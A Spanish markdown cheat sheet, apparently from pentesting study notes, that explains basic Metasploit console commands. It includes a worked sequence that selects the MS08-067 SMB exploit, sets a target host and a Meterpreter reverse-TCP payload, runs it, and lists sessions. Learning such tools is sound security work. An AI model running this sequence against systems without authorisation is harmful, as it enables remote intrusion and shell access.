### **Hacking Web/LFI y RCE/Metasploit.md**

# Metasploit

## Descripción

`Metasploit` es un framework de código abierto para desarrollar, probar y ejecutar exploits contra sistemas remotos. Ofrece una amplia gama de módulos para explotación, payloads, scanners y herramientas auxiliares que facilitan las pruebas de penetración y la investigación de seguridad.

## Uso

```bash
msfconsole
```

### Opciones principales

- `use`: Selecciona un módulo específico para usar.
- `set`: Configura opciones para el módulo seleccionado.
- `exploit`: Ejecuta el exploit configurado.
- `search`: Busca módulos por nombre o descripción.
- `info`: Muestra información detallada sobre un módulo.
- `show`: Lista módulos disponibles (e.g., show exploits, show payloads).
- `sessions`: Gestiona sesiones activas de exploits.
- `exit`: Sale de Metasploit.

## Ejemplos

- Iniciar Metasploit:
  
  ```bash
  msfconsole
  ```

- Buscar un exploit para Windows:
  
  ```bash
  search type:exploit platform:windows
  ```

- Seleccionar un módulo de exploit:
  
  ```bash
  use exploit/windows/smb/ms08_067_netapi
  ```

- Configurar la opción RHOST (host remoto):
  
  ```bash
  set RHOST 192.168.1.10
  ```

- Configurar el payload:
  
  ```bash
  set PAYLOAD windows/meterpreter/reverse_tcp
  ```

- Ejecutar el exploit:
  
  ```bash
  exploit
  ```

- Listar sesiones activas:
  
  ```bash
  sessions
  ```
